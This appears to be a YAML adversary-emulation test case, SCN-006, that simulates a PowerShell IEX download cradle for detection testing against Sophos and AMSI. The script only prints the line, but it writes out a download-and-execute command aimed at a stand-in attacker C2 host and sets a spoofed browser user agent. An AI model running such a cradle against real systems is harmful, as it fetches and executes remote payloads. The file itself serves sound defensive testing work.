---
- id: scn006-a3-payload-download-exec
  name: "SCN-006 | Simulated Payload Download and Execute"
  description: |
    Simulates an IEX (Invoke-Expression) download cradle — the most common
    PowerShell payload delivery technique. Creates a WebClient with a spoofed
    browser user-agent string to blend with normal traffic, narrates the
    DownloadString C2 call, and explains what Sophos Web Control and AMSI
    telemetry detect. No actual download is made. Maps to T1059.001.
  tactic: execution
  technique:
    attack_id: T1059.001
    name: "Command and Scripting Interpreter: PowerShell"
  platforms:
    windows:
      psh:
        command: |
          Write-Output "=== PAYLOAD DOWNLOAD CRADLE SIMULATION (T1059.001) ===";
          Write-Output "[*] Simulating IEX download cradle...";
          $userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";
          $webClient = New-Object System.Net.WebClient;
          $webClient.Headers.Add("User-Agent", $userAgent);
          Write-Output "[*] WebClient created with spoofed user agent:";
          Write-Output "    $userAgent";
          Write-Output "";
          Write-Output "[SIMULATED] IEX (New-Object Net.WebClient).DownloadString('http://c2.attacker.com/payload.ps1')";
          Write-Output "[SIMULATED] Payload download intercepted by Sophos Web Control";
          Write-Output "";
          Write-Output "[*] Real attack would pull stage-2 malware from attacker C2 server";
          Write-Output "[*] Sophos detects:";
          Write-Output "    - Suspicious PowerShell network activity (AMSI telemetry)";
          Write-Output "    - Malicious URL reputation block (Web Control)";
          Write-Output "    - PowerShell WebClient anomaly (behavioral)";
          $webClient.Dispose();
          Write-Output "[*] WebClient disposed";
          Write-Output "=== END DOWNLOAD CRADLE ==="
        cleanup: |
          Remove-Item $env:TEMP\*.ps1 -Force -ErrorAction SilentlyContinue;
          Write-Output "Temp PS1 files cleared"
